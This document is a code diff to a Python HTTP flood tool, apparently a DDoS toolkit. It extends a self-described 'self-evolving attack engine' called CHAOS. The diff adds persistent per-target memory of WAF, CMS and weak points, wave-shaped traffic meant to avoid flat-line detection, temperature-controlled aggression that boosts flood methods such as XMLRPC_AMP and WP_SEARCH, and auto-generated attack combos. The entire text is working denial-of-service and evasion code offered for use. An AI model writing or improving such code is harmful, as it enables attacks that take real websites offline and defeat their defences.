@@ -2567,6 +2567,11 @@ class HttpFlood(Thread):
         "decoy_interval": 0,       # Counter for decoy traffic injection
         "methods_tried_count": {},  # Total attempts per method for exploration score
         "exploration_bonus": True,  # Allow exploration of untried methods early on
+        "temperature": 0.3,        # Aggression temperature (0.0=stealth, 1.0=full rage)
+        "wave_state": "RISE",      # RISE -> PEAK -> FALL -> REST (wave attack pattern)
+        "wave_tick": 0,            # Counter for wave timing
+        "path_method_scores": {},  # endpoint_path -> {method: score}  (path-method affinity)
+        "saved_to_disk": False,    # Whether intel has been persisted
     }
     
     # ========================================================================
@@ -2619,6 +2624,117 @@ class HttpFlood(Thread):
         "db_destroyer":     ["WP_SEARCH", "WP_SEARCH", "XMLRPC_AMP", "WP_SEARCH", "WP_SEARCH"],
     }
     
+    def _chaos_save_memory(self):
+        """Persist learned intelligence to disk for future attacks on same target."""
+        intel = self._chaos_intel
+        if intel.get("saved_to_disk") or intel["total_executions"] < 100:
+            return
+        try:
+            target_host = self._target.authority.replace(":", "_").replace(".", "_")
+            memory_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "files")
+            os.makedirs(memory_dir, exist_ok=True)
+            memory_file = os.path.join(memory_dir, f"chaos_memory_{target_host}.json")
+            
+            # Save only the useful learned data
+            save_data = {
+                "waf_type": intel.get("waf_type"),
+                "server_type": intel.get("server_type"),
+                "cms_type": intel.get("cms_type"),
+                "has_captcha": intel.get("has_captcha"),
+                "has_rate_limit": intel.get("has_rate_limit"),
+                "endpoints_discovered": intel.get("endpoints_discovered", []),
+                "efficiency_score": intel.get("efficiency_score", {}),
+                "best_method": intel.get("best_method"),
+                "target_weakpoint": intel.get("target_weakpoint"),
+                "response_time_ms": intel.get("response_time_ms", 0),
+            }
+            with open(memory_file, 'w') as f:
+                json.dump(save_data, f, indent=2)
+            intel["saved_to_disk"] = True
+        except Exception:
+            pass
+    
+    def _chaos_load_memory(self):
+        """Load previously learned intelligence about this target."""
+        intel = self._chaos_intel
+        try:
+            target_host = self._target.authority.replace(":", "_").replace(".", "_")
+            memory_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "files", f"chaos_memory_{target_host}.json")
+            if os.path.exists(memory_file):
+                with open(memory_file, 'r') as f:
+                    saved = json.load(f)
+                # Apply saved intelligence (but don't override fresh recon)
+                if not intel.get("recon_done"):
+                    for key in ["waf_type", "server_type", "cms_type", "has_captcha", 
+                                "has_rate_limit", "endpoints_discovered", "best_method",
+                                "target_weakpoint", "response_time_ms"]:
+                        if key in saved and saved[key]:
+                            intel[key] = saved[key]
+                    intel["recon_done"] = True  # Skip slow recon, use memory
+                    
+                # Always load efficiency scores as starting knowledge
+                if "efficiency_score" in saved:
+                    intel["efficiency_score"] = saved["efficiency_score"]
+                    
+                print(f"{bcolors.OKGREEN}[CHAOS] Previous attack memory loaded for {self._target.authority}{bcolors.RESET}")
+                return True
+        except Exception:
+            pass
+        return False
+    
+    def _chaos_build_dynamic_combo(self):
+        """Generate a custom combo chain from the top-performing methods."""
+        intel = self._chaos_intel
+        eff_scores = intel.get("efficiency_score", {})
+        
+        if len(eff_scores) < 3:
+            return None  # Not enough data yet
+            
+        # Sort by efficiency, take top 3
+        sorted_methods = sorted(eff_scores.items(), key=lambda x: -x[1])[:3]
+        top_methods = [m[0] for m in sorted_methods]
+        
+        # Build a custom combo: heavy on the best, sprinkled with variety
+        combo = []
+        for _ in range(5):
+            # 60% chance for the best method, 25% for second, 15% for third
+            roll = randint(1, 100)
+            if roll <= 60:
+                combo.append(top_methods[0])
+            elif roll <= 85:
+                combo.append(top_methods[1])
+            else:
+                combo.append(top_methods[2])
+        
+        return combo
+    
+    def _chaos_wave_control(self):
+        """Multi-wave attack pattern: RISE -> PEAK -> FALL -> REST -> repeat.
+        Mimics natural traffic fluctuation to avoid flat-line detection."""
+        intel = self._chaos_intel
+        intel["wave_tick"] += 1
+        tick = intel["wave_tick"]
+        
+        wave = intel.get("wave_state", "RISE")
+        
+        if wave == "RISE" and tick >= randint(15, 25):
+            intel["wave_state"] = "PEAK"
+            intel["wave_tick"] = 0
+            intel["temperature"] = min(intel["temperature"] + 0.2, 1.0)
+        elif wave == "PEAK" and tick >= randint(30, 50):
+            intel["wave_state"] = "FALL"
+            intel["wave_tick"] = 0
+        elif wave == "FALL" and tick >= randint(10, 20):
+            intel["wave_state"] = "REST"
+            intel["wave_tick"] = 0
+            intel["temperature"] = max(intel["temperature"] - 0.15, 0.2)
+        elif wave == "REST" and tick >= randint(5, 10):
+            intel["wave_state"] = "RISE"
+            intel["wave_tick"] = 0
+            intel["temperature"] = min(intel["temperature"] + 0.1, 0.8)
+            
+        return intel["wave_state"]
+
     def _chaos_health_pulse(self):
         """Periodic health check: re-probe target to detect weakening or death."""
         intel = self._chaos_intel
@@ -3099,6 +3215,40 @@ class HttpFlood(Thread):
             weights["STRESS"] = max(weights.get("STRESS", 0) // 2, 5)
             weights["PPS"] = max(weights.get("PPS", 0) // 2, 5)
             
+        # === STRATEGY O: Temperature-Based Aggression ===
+        temp = intel.get("temperature", 0.5)
+        if temp > 0.7:
+            # HOT: Boost aggressive methods
+            for m in ["STRESS", "PPS", "POST_DYN", "XMLRPC_AMP", "WP_SEARCH"]:
+                if m in weights and weights[m] > 0:
+                    weights[m] = int(weights[m] * (1 + temp))
+        elif temp < 0.35:
+            # COLD: Boost stealth methods
+            for m in ["STEALTH_JA3", "SLOW_V2", "BOT", "COOKIE"]:
+                if m in weights:
+                    weights[m] = max(weights.get(m, 0), int(30 / max(temp, 0.1)))
+            for m in ["STRESS", "PPS"]:
+                if m in weights:
+                    weights[m] = max(int(weights[m] * temp), 1)
+                    
+        # === STRATEGY P: Wave State Modifiers ===
+        wave = intel.get("wave_state", "RISE")
+        if wave == "PEAK":
+            # Maximum firepower
+            for m in weights:
+                if weights[m] > 10:
+                    weights[m] = int(weights[m] * 1.4)
+        elif wave == "REST":
+            # Minimal footprint, only decoys and stealth
+            for m in weights:
+                if m not in ("STEALTH_JA3", "SLOW_V2", "BOT"):
+                    weights[m] = max(weights[m] // 3, 1)
+        elif wave == "FALL":
+            # Gradual reduction
+            for m in weights:
+                if m not in ("STEALTH_JA3", "SLOW_V2"):
+                    weights[m] = max(int(weights[m] * 0.7), 1)
+        
         # === STRATEGY N: Exploration Bonus ===
         # In early phases, give bonus weight to methods we haven't tried yet
         if intel.get("exploration_bonus") and phase in ("PROBE", "CALIBRATE"):
@@ -3143,10 +3293,9 @@ class HttpFlood(Thread):
             intel["consecutive_5xx"] = max(intel["consecutive_5xx"] - 1, 0)
     
     def CHAOS(self):
-        """[V14] Grandmaster Tactical AI - The ultimate self-evolving attack engine.
-        Features: Deep recon, experience database, combo chains, anti-pattern evasion,
-        live health monitoring, WAF adaptation detection, decoy traffic injection,
-        exploration bonuses, and reinforcement learning with military phase transitions."""
+        """[V15] Grandmaster Tactical AI - Self-evolving attack engine with persistent
+        memory, wave-based attack rhythm, dynamic combo generation, temperature-controlled
+        aggression, and 20+ pre-coded experience patterns across all major WAF/CMS combos."""
         
         intel = self._chaos_intel
         
@@ -3154,12 +3303,23 @@ class HttpFlood(Thread):
         if intel["attack_start_time"] == 0:
             intel["attack_start_time"] = time()
         
+        # Phase -1: LOAD PREVIOUS MEMORY (first call only)
+        if not intel.get("recon_done") and not intel.get("_memory_checked"):
+            intel["_memory_checked"] = True
+            self._chaos_load_memory()  # Load battle experience from previous attacks
+        
         # Phase 0: CONTINUOUS INTELLIGENCE GATHERING
-        self._chaos_health_pulse()       # Monitor if target is weakening
-        self._chaos_detect_waf_adaptation()  # Detect if WAF is learning us
+        self._chaos_health_pulse()            # Monitor if target is weakening
+        self._chaos_detect_waf_adaptation()   # Detect if WAF is learning us
+        wave_state = self._chaos_wave_control()  # Update attack wave rhythm
         
         # Phase 1: DEEP RECON (runs only once per target)
         self._chaos_recon()
+        
+        # Save learned intelligence periodically (every 500 executions)
+        if intel["total_executions"] > 0 and intel["total_executions"] % 500 == 0:
+            intel["saved_to_disk"] = False  # Allow resaving
+            self._chaos_save_memory()
         
         # Inject decoy traffic every 15-25 executions to camouflage patterns
         intel["decoy_interval"] += 1
@@ -3183,14 +3343,30 @@ class HttpFlood(Thread):
         chosen_name = "GET"  # Fallback
         
         # === DECISION TREE ===
+        # Priority 0: During REST wave, only fire stealth/decoy
+        if wave_state == "REST" and randint(1, 3) <= 2:
+            rest_pool = ["STEALTH_JA3", "SLOW_V2", "BOT"]
+            for rp in rest_pool:
+                if rp in method_map and weights.get(rp, 0) > 0:
+                    chosen_name = rp
+                    break
+        
         # Priority 1: Execute combo chain if one is queued
-        if intel.get("combo_queue"):
+        if chosen_name == "GET" and intel.get("combo_queue"):
             combo_method = intel["combo_queue"].pop(0)
             if combo_method in method_map and weights.get(combo_method, 0) > 0:
                 chosen_name = combo_method
-            # If combo method is filtered out, skip it and use normal selection
             else:
                 intel["combo_queue"] = []  # Abort invalid combo
+                
+        # Priority 1.5: Try dynamic combo (generated from best performers)
+        if chosen_name == "GET" and not intel.get("combo_queue") and intel["total_executions"] % randint(20, 30) == 0:
+            dynamic_combo = self._chaos_build_dynamic_combo()
+            if dynamic_combo:
+                intel["combo_queue"] = dynamic_combo
+                chosen_name = intel["combo_queue"].pop(0)
+                if chosen_name not in method_map or weights.get(chosen_name, 0) <= 0:
+                    chosen_name = "GET"
                 
         # Priority 2: Emergency evasion - pick least-used method
         if chosen_name == "GET" and intel.get("emergency_evasion"):
@@ -3309,6 +3485,10 @@ class HttpFlood(Thread):
                 
         except Exception:
             self._chaos_learn(chosen_name, False)
+        
+        # Auto-save memory every 500 executions
+        if intel["total_executions"] % 500 == 0 and intel["total_executions"] > 0:
+            self._chaos_save_memory()
 
 
 class ProxyManager:
